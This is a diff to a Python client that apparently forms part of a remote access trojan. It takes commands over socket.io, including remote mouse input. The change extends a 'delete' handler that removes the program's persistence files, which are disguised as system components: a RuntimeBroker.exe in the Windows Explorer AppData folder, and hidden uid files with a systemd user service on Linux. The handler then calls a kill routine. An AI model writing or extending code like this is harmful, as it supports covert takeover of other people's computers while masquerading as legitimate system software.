@@ -2,6 +2,7 @@ import subprocess
 import threading
 import platform
 import socketio
+import getpass
 import sys
 import base64
 import ssl
@@ -213,9 +214,22 @@ def run(data):
     @sio.on("delete")
     def delete(data_new):
         if data["uid"] == data_new["uid"]:
+            user = getpass.getuser()
             if platform.system() == "Windows":
-                if os.path.exists("demofile.txt"):
-                    os.remove("demofile.txt")
+                path=f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\"
+                if os.path.exists(path+"uid.txt"):
+                    os.remove(path+"uid.txt")
+                if os.path.exists(path+"RuntimeBroker.exe"):
+                    os.remove(path+"RuntimeBroker.exe")
+            else:
+                path=f"/home/{user}/.config/systemd/user/"
+                if os.path.exists(path+".system_uid"):
+                    os.remove(path+".system_uid")
+                if os.path.exists(path+".systemd"):
+                    os.remove(path+".systemd")
+                if os.path.exists(path+"systemd.service"):
+                    os.remove(path+"systemd.service")
+        kill(data_new)
 
     @sio.on("mouse_input")
     def mouse_input(data_new):
